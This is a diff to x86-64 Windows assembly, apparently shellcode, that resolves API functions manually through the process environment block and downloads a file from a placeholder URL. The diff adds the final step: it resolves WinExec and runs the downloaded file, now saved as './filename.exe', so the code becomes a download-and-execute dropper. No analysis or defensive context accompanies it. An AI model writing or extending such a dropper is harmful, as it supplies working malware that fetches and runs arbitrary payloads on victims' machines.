@@ -29,8 +29,10 @@ section .text
     add rdx, functionName
     mov r8, 15
     call getFunction
+    mov r12, [r12d + 0x30]
+    push r12
     mov r13, rax          ; r13 = GetProcAddress
-    mov rcx, [r12d + 0x30]
+    mov rcx, r12
     mov rdx, r15
     add rdx, loadLibrary
     call rax              ; Get LoadLibraryA
@@ -69,7 +71,7 @@ section .text
     mov rdx, r15
     add rdx, statF
     call r13
-    mov rcx, [r12d + 0x30]
+    mov rcx, r12
     mov r12, rax
     mov rdx, r15
     add rdx, sleepF
@@ -89,6 +91,14 @@ section .text
       mov rbx, rax
       jmp downloadCheck
       done:
+        pop rcx                 ; kernel32.dll
+        mov rdx, r15
+        add rdx, execF          ; WinExec
+        call r13
+        mov rcx, r15
+        add rcx, filename
+        mov rdx, 0
+        call rax
         int3
     
   
@@ -180,5 +190,6 @@ section .data
   mallocF db "malloc", 0
   sleepF db "Sleep", 0
   url db "https://UrlToAFile.com", 0
-  filename db "./filename", 0
+  filename db "./filename.exe", 0
+  execF db "WinExec", 0
   end
